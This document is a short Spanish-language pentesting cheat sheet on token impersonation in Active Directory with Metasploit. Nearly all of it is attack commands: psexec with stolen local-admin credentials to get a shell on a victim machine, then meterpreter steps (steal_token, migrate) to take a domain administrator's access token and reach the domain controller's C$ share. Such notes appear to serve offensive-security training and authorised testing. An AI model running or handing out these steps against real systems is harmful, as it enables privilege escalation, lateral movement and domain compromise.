# Token Impersonation 

Tags: #AD #TokenImpersonation #Metasploit 

## Metasploit 

```bash 
# Utilizando las credenciales de un usuario con privilegios de admin local  
❯ msfconsole -q                   # Iniciar metasploit 
❯ use exploit/windows/smb/psexec 
❯ show options 
	❯ set rhost IP                # IP de la máquina víctima 
	❯ set smbdomain domain1
	❯ set smbpass password1
	❯ set smbuser user1 
	❯ set lhost IP_Kali
	❯ exploit 
	❯ shell                       # Obtener una shell de Windows 
```

Si el **Administrador** de dominio se ha conectado remotamente a la máquina donde tenemos la sesión se puede hacer lo siguiente:

```bash 
# En la sesión de meterpreter con metasploit 
❯ ps                   # Enumerar los procesos activos en el sistema y que usuario ejecuta ese proceso. Buscar 'powershell.exe'
❯ getuid               # Mirar que usuario soy 
❯ steal_token PID      # El proceso que se ejecuta con ese PID es copiado a nuestro proceso referenciado por el 'access token' 
	# PID = Es la primer columna al ejecutar el comando 'ps'
❯ shell                # Obtener una shell de Windows 
	❯ whoami           # El usuario ahora es 'domain1\administrator' de dominio y ya no 'nt authority\system' local 
	❯ dir \\DC01\c$    # Mirar el recurso del DC 
	❯ rev2self         # Regresar al usuario 'nt authority\system' local


# Si no se puede copiar el token, se puede migrar el payload al proceso que se ejecuta con el 'access token' del usuario que nos interesa (Administrator)
❯ migrate PID          # No es recomendable hacerlo en un entorno real 
❯ getuid 
❯ shell 
```